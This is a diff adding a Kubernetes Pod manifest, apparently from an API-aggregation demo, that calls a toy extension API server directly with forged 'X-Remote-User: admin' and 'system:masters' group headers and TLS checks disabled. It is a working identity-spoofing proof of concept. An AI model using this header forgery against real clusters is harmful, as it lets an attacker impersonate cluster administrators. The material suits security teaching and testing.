@@ -1,0 +1,11 @@
+# Calls the extension server DIRECTLY (bypassing kube-apiserver) with forged identity headers.
+apiVersion: v1
+kind: Pod
+metadata: {name: spoof, namespace: agg-demo}
+spec:
+  restartPolicy: Never
+  containers:
+  - name: curl
+    image: curlimages/curl:8.10.1
+    args: [-sk, -H, "X-Remote-User: admin", -H, "X-Remote-Group: system:masters",
+           "https://toy-apiserver.agg-demo.svc/apis/toys.example.com/v1/namespaces/x/whoamis/me"]
